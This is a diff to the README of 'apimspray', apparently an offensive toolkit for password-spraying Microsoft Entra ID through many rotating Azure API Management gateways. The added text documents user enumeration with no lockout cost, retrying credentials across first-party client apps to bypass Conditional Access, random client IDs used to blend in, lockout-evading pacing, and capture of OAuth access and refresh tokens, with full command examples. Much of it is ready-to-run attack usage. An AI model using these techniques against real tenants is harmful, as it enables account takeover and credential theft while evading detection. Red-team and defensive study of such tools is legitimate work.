@@ -41,6 +41,16 @@ apimspray is a specialized **Entra ID Passwordspraying Toolkit** designed for au
    ```
    _Note: The rotator script relies on an active background Azure CLI session to deploy resources._
 
+### Install as a command (optional)
+
+To call `apimspray` from any directory instead of `python3 apimspray.py`, install the project. This exposes three console scripts — `apimspray`, `apimspraycreate`, and `apimspray-upns`:
+
+```bash
+pip install -e .        # or: pipx install .   /   uv pip install -e .
+```
+
+Once installed, everything below works the same with `apimspray ...` in place of `python3 apimspray.py ...`, from any working directory.
+
 ## Setup
 
 ### Quick Start (Azure Cloud Shell)
@@ -73,10 +83,16 @@ Deploys 33 APIM instances into Germanywestcentral and westeurope and saves to ur
  python3 apimspraycreate.py --location germanywestcentral,westeurope --count 33 --outfile urls.txt
 ```
 
+By default gateways expose the ROPC token endpoint (`/common/oauth2/token`) for spraying. To enumerate users (see [`validate-users`](#modes)) deploy a **separate** set of gateways that expose `/common/GetCredentialType` with `--task enum`, and keep them in their own URL file:
+
+```bash
+python3 apimspraycreate.py --task enum --count 33 --outfile urls_enum.txt
+```
+
 **apimspraycreate CLI reference:**
 
 ```text
-usage: apimspraycreate.py [-h] --outfile OUTFILE [--count COUNT] [--location LOCATION] [--prefix PREFIX] [--realm-prefix REALM_PREFIX] [--delete-old]
+usage: apimspraycreate.py [-h] --outfile OUTFILE [--count COUNT] [--location LOCATION] [--prefix PREFIX] [--task {spray,enum}] [--delete-old]
 
 apimspraycreate - Azure APIM Deployer
 
@@ -86,8 +102,7 @@ options:
   --count COUNT         Number of instances
   --location LOCATION   Comma-separated APIM location(s) to deploy into. When provided, only those regions are used and the first location is used for the resource group.
   --prefix PREFIX       API URL prefix
-  --realm-prefix REALM_PREFIX
-                        Realm API prefix
+  --task {spray,enum}   Which operation to expose on the gateways. 'spray' -> /common/oauth2/token (default). 'enum' -> /common/GetCredentialType for user enumeration (use a separate --outfile, e.g. urls_enum.txt).
   --delete-old          Delete old resource groups
 ```
 
@@ -132,8 +147,8 @@ options:
 ## Usage
 
 ```text
-usage: apimspray.py [-h] [--urls URLS] [--users USERS] [--passwords PASSWORDS] [--output OUTPUT] [--tenant TENANT] [--domain DOMAIN] --mode {spray,validate} [--pace {stealth,low,mid,medium,high}]
-                    [--continue-on-success]
+usage: apimspray.py [-h] [--urls URLS] [--users USERS] [--passwords PASSWORDS] [--output OUTPUT] [--tenant TENANT] [--domain DOMAIN] --mode {spray,validate,validate-users,validate-clients}
+                    [--pace {stealth,stealth-multi,low,mid,medium,high}] [--continue-on-success]
 
 apimspray - Entra ID Assessment Tool
 
@@ -146,8 +161,13 @@ options:
   --output OUTPUT       Output directory
   --tenant TENANT       Tenant ID or Domain
   --domain DOMAIN       Append domain to users if missing
-  --mode {spray,validate}
-                        Operation mode. 'spray' tests all passwords against all users (1:N). 'validate' performs 1:1 credential pair testing.
+  --client-id CLIENT_ID Pin a specific client app (GUID) for every request instead of randomizing across the built-in first-party apps. A known GUID reuses its resource/scope; an unknown one uses Graph defaults.
+  --resource RESOURCE   OAuth resource to request. Overrides the client app default (use with --client-id).
+  --scope SCOPE         OAuth scope to request. Overrides the client app default (use with --client-id).
+  --client-ids CLIENT_IDS
+                        For validate-clients mode: comma-separated client-app GUIDs, or a path to a file with one GUID per line. Each credential pair is tried against every client. Defaults to the built-in first-party apps if omitted.
+  --mode {spray,validate,validate-users,validate-clients}
+                        Operation mode. 'spray' tests all passwords against all users (1:N). 'validate' performs 1:1 credential pair testing. 'validate-users' enumerates which users exist via GetCredentialType (no password sent, does not count toward lockout); point --urls at an enum gateway list. 'validate-clients' is 1:1 pair testing where each pair is tried against every client ID in --client-ids.
   --pace {stealth,low,mid,medium,high}
                         Pacing profile for requests and lockout management:
                          - high:    15 workers, 0.1s delay, 10 passes/chunk, 5m lockout, 20 safe threshold
@@ -171,6 +191,50 @@ options:
   python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords common_passwords.txt --pace medium
   ```
 
+  Full example with user shuffling and lockout controls:
+
+  ```bash
+  python3 apimspray.py \
+      --urls urls50.txt \
+      --mode spray \
+      --users imss_upns_not_cracked.txt \
+      --passwords imss_pwd_candidates.txt \
+      --pace medium \
+      --shuffle-users \
+      --safe-threshold 100 \
+      --auto-throttle \
+      --continue-on-success
+  ```
+
+- **validate-users**: Enumerates which users exist via the `GetCredentialType` endpoint. **No password is submitted, so this never counts toward Smart Lockout.** Point `--urls` at an enum gateway list built with `apimspraycreate.py --task enum` (see [Deploy Gateways](#1-deploy-gateways)). Existing users are written to `existing_*.txt`, the rest to `nonexistent_*.txt`. If Microsoft starts throttling (`ThrottleStatus`), results become unreliable — the tool warns you to lower `--pace`.
+  ```bash
+  python3 apimspray.py --urls urls_enum.txt --mode validate-users --users users.txt --domain corp.com --pace low
+  ```
+
+- **validate-clients**: 1:1 `user:password` pair testing (equal-length lists, like `validate`), except each pair is tried against **every** client ID in `--client-ids`. A credential blocked by Conditional Access on one client app can still return a token on another — this mode surfaces which apps work. Every attempt is logged per client, and any token is saved to `tokens_*.jsonl` tagged with its `client_id`. Falls back to the four built-in apps if `--client-ids` is omitted.
+  ```bash
+  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt \
+      --client-ids d3590ed6-52b3-4102-aeff-aad2292ab01c,1fec8e78-bce4-4aaf-ab1b-5451cc387264
+  # or from a file, one GUID per line:
+  python3 apimspray.py --urls urls.txt --mode validate-clients --users u.txt --passwords p.txt --client-ids client_ids.txt
+  ```
+
+  > **Note:** each pair costs one request per client ID. With a *wrong* password that multiplies failed attempts per user and can accelerate lockout — this mode is intended for credentials you already believe are valid but that appear CA-blocked.
+
+### Client App
+
+By default each request randomly picks one of four built-in first-party client apps (Office, Azure AD PowerShell, Exchange Online, Teams) to blend in. Pass `--client-id <GUID>` to pin a single app for the whole run — useful when a tenant gates specific apps behind Conditional Access, or when you need a token for a particular resource.
+
+- A **known** GUID reuses that app's `resource`/`scope`.
+- An **unknown** GUID defaults to Graph (`https://graph.microsoft.com`) with scope `openid profile offline_access`.
+- `--resource` / `--scope` override either (and are ignored without `--client-id`).
+
+```bash
+# Pin the Microsoft Teams client and request an Outlook token
+python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords p.txt \
+    --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://outlook.office365.com
+```
+
 ### Pacing Profiles
 
 The `--pace` argument controls the aggressiveness of the spray. Values are hardcoded to ensure stability and safety.
@@ -189,11 +253,30 @@ The `--pace` argument controls the aggressiveness of the spray. Values are hardc
 
 ## Output
 
-Results are stored in the `results/<timestamp>/` directory:
+Each run gets its own directory named `<date>_<time>_<mode>` (e.g. `2026-07-06_2302_spray`), and `results/latest` symlinks to the most recent run (where the filesystem supports symlinks):
 
-- `valid_*.txt`: Successful authentications (MFA Required or Token received).
-- `blocked_*.txt`: Locked or conditionally blocked accounts.
-- `failed_*.txt`: Invalid credentials or user not found.
+```
+results/
+  2026-07-06_2302_spray/
+    manifest.json     run metadata: args, counts, start/finish, tokens captured
+    results.jsonl     one JSON object per attempt — the source of truth
+    valid.txt         human-friendly view of the interesting hits
+    tokens.jsonl      captured OAuth tokens
+  latest -> 2026-07-06_2302_spray/
+```
+
+- **`results.jsonl`** — every attempt, one JSON object per line: `ts`, `mode`, `username`, `password`, `classification`, `aadsts`, `client_id`, `resource`, `gateway`, `http_status`, `has_token`. Query it with `jq`:
+  ```bash
+  # all valid creds
+  jq -r 'select(.classification|startswith("VALID")) | "\(.username):\(.password)"' results.jsonl
+  # everything that happened to one user
+  jq 'select(.username=="bob@corp.com")' results.jsonl
+  ```
+- **`valid.txt`** — quick-glance hits: `user:pass | classification` for auth modes, or existing UPNs for `validate-users`.
+- **`tokens.jsonl`** — any OAuth tokens obtained, one JSON object per line: `username`, `password`, `client_id`, `resource`, `gateway`, plus `access_token` / `refresh_token` / `id_token` and metadata. Only written when an attempt returns a token.
+- **`manifest.json`** — self-describing run record (mode, pace, gateway/user/password counts, client IDs, start/finish timestamps, totals).
+
+`--resume <run-dir>` reads that run's `results.jsonl` to skip already-tested users.
 
 ## Credits & References
 
